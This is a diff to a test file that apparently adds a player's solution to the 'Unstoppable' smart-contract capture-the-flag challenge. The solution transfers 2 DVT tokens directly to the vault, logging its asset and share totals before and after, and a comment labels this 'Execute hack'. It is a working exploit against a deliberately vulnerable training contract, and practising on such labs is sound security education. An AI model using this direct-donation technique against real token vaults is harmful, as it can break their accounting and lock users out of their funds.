@@ -45,6 +45,16 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("[Before] Vault assets: %s DVT", ethers.utils.formatEther(await vault.totalAssets()));
+        console.log("[Before] Vault tokens: %s oDVT", ethers.utils.formatEther(await vault.totalSupply()));
+        await token.connect(player).transfer(vault.address, ethers.utils.parseEther("2.0"));
+        console.log("[After] Vault assets: %s DVT", ethers.utils.formatEther(await vault.totalAssets()));
+        console.log("[After] Vault tokens: %s oDVT", ethers.utils.formatEther(await vault.totalSupply()));
+        // [Before] Vault: totalAssets
+        // [Before] Vault: totalTokens
+        // Execute hack
+        // [After] Vault: totalAssets
+        // [After] Vault: totalTokens
     });
 
     after(async function () {
